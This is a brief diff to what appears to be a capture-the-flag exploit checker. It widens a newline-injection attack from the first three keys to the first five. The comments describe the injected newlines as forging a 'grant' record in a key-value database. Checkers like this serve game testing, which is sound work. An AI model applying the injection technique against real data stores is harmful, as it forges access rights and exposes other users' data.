@@ -262,8 +262,8 @@ async def exploit_kv_newline_injection(task: ExploitCheckerTaskMessage, logger: 
     my_token = generate_token()
 
     # get keys
-    keys = (await client.api_get(username))[:3]
-    # hack first 3 keys
+    keys = (await client.api_get(username))[:5]
+    # hack first 5 keys
     data = ''
     for key in keys:
         # these newlines inject a faked "grant" structure into the database
